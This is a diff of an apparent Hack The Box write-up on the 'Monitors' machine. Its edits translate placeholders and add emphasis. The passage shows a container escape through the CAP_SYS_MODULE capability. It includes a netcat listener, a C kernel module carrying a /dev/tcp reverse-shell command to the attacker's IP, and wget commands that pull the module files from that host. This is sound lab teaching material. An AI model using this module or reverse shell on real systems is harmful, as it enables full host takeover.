-&lt;p&gt;Before sending this second &lt;em&gt;payload&lt;/em&gt;, we will set our machine to listen using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt; to receive the reverse shell:&lt;/p&gt;
+&lt;p&gt;Before sending this second &lt;em&gt;payload&lt;/em&gt;, we will set our machine to listen using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt; to receive the &lt;em&gt;reverse shell&lt;/em&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -nlvp 443
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -1255,7 +1251,7 @@
 
 &lt;p&gt;Among the &lt;em&gt;capabilities&lt;/em&gt; found in the container, we identified &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_DAC_OVERRIDE&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_MODULE&lt;/code&gt;, both of which we could attempt to exploit. With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_DAC_OVERRIDE&lt;/code&gt;, we could write to the host machine’s filesystem. However, for this to be possible, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_DAC_READ_SEARCH&lt;/code&gt; capability must also be present, which is not the case here, so this exploitation path is not viable. Instead, we can exploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_MODULE&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;This &lt;em&gt;capability&lt;/em&gt; allows processes to load and unload &lt;em&gt;kernel modules&lt;/em&gt;, enabling us to inject code directly into the system’s &lt;em&gt;kernel&lt;/em&gt;. Since containers are isolated at the operating system (OS) level but share the &lt;em&gt;kernel&lt;/em&gt; with the host system, this &lt;em&gt;capability&lt;/em&gt; allows us to interact with it through the container. This enables us to fully compromise the system by modifying the &lt;em&gt;kernel&lt;/em&gt; and bypassing all Linux security barriers, including security modules and the container’s isolation itself.&lt;/p&gt;
+&lt;p&gt;This &lt;em&gt;capability&lt;/em&gt; allows processes to load and unload &lt;em&gt;kernel modules&lt;/em&gt;, enabling us to inject code directly into the system’s &lt;em&gt;kernel&lt;/em&gt;. Since containers are isolated at the operating system (OS) level but share the &lt;em&gt;kernel&lt;/em&gt; with the host system, this &lt;em&gt;capability&lt;/em&gt; allows us to interact with &lt;em&gt;it&lt;/em&gt; through the container. This enables us to fully compromise the system by modifying the &lt;em&gt;kernel&lt;/em&gt; and bypassing all Linux security barriers, including security modules and the container’s isolation itself.&lt;/p&gt;
 
 &lt;p&gt;To take advantage of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_MODULE&lt;/code&gt; capability and escape the container, we will write a &lt;em&gt;kernel module&lt;/em&gt; that opens a &lt;em&gt;reverse shell&lt;/em&gt; to our attacker machine. This module will be compiled using a &lt;em&gt;Makefile&lt;/em&gt;, and then injected into the host system’s &lt;em&gt;kernel&lt;/em&gt; to execute the code.&lt;/p&gt;
 
@@ -1264,7 +1260,7 @@
 &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;linux/kmod.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
 #include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;linux/module.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
 &lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;nuestraIP&amp;gt;/4444 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ourIP&amp;gt;/4444 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__init&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;reverse_shell_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
@@ -1305,10 +1301,10 @@
 
 &lt;p&gt;From the container, we will download the two files we just created using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt;.&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://&amp;lt;nuestraIP&amp;gt;:80/reverse-shell.c
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://&amp;lt;ourIP&amp;gt;:80/reverse-shell.c
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://&amp;lt;nuestraIP&amp;gt;:80/Makefile
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://&amp;lt;ourIP&amp;gt;:80/Makefile
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/64.png&quot; alt=&quot;64&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
